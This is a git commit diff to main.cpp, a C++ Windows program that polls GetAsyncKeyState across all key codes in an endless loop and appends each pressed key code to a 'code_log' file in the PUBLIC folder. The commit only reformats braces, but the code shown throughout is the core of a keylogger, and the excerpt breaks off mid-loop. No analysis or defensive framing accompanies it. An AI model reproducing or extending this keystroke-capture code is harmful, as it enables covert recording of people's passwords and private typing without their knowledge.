d15ff145182a92db3e5ab6df20dbf09a5cd1781d
Hundtro <dhund@protonmail.com>
2018-09-28 16:47:02 +0200

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -10,26 +10,18 @@ int main()
     std::string enc_log;
     std::ofstream file;
 
-    if(const char* public_var = std::getenv("PUBLIC"))
-    {
+    if(const char* public_var = std::getenv("PUBLIC")) {
         enc_log  = public_var;
         enc_log += "\\code_log";
-    }
-    else
-    {
+    } else {
         return 1;
     }
 
-    while (true)
-    {
+    while (true) {
         Sleep(1);
-
-        for (int i = 0; i < 255; i++)
-        {
+        for (int i = 0; i < 255; i++) {
             int state = GetAsyncKeyState(i);
-
-            if (state == 1 || state == -32767)
-            {
+            if (state == 1 || state == -32767) {
                 file.open(enc_log, std::ios::app);
                 file << i << ".";
                 file.flush();
